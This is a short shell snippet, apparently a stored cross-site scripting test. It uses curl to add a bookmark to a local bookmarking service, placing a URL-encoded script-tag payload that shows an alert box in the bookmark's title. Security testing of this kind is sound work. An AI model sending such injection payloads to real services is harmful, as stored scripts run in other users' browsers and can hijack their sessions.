
# Adds a bookmark with a script in the title to trigger XSS

AUTH=123456
curl "http://localhost:8888/$AUTH/add/full/abc/http%3A%2F%2Fexample.com/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E/1"
